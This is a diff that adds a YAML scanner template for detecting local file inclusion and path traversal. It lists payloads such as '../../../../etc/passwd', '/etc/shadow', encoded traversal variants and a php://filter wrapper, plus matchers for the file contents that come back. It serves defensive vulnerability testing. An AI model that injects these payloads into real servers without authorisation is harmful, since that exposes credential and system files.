@@ -1,0 +1,50 @@
+id: lfi-path-traversal
+name: Local File Inclusion / Path Traversal
+severity: high
+vulnerability_type: lfi
+owasp: "A01:2021 Broken Access Control"
+cwe: CWE-22
+description: Detects LFI and directory traversal via ../../../etc/passwd and similar payloads
+tags: [lfi, path-traversal, file-inclusion]
+
+payloads:
+  - "../../../../etc/passwd"
+  - "..\\..\\..\\..\\windows\\win.ini"
+  - "....//....//....//....//etc/passwd"
+  - "/etc/passwd"
+  - "../../../../etc/shadow"
+  - "../../../../etc/hosts"
+  - "....//....//....//....//etc/hosts"
+  - "..%2f..%2f..%2f..%2fetc/passwd"
+  - "..%252f..%252f..%252f..%252fetc/passwd"
+  - "/proc/self/environ"
+  - "php://filter/convert.base64-encode/resource=/etc/passwd"
+
+request:
+  method: GET
+  inject_in: query
+
+matchers:
+  - type: word
+    value: "root:x:0:0"
+    part: body
+  - type: regex
+    value: "root:.*:0:0:"
+    part: body
+  - type: word
+    value: "[extensions]"
+    part: body
+  - type: word
+    value: "; for 16-bit app support"
+    part: body
+  - type: regex
+    value: "daemon:x:\\d+:\\d+"
+    part: body
+  - type: word
+    value: "DOCUMENT_ROOT="
+    part: body
+  - type: word
+    value: "HTTP_USER_AGENT="
+    part: body
+
+match_condition: or
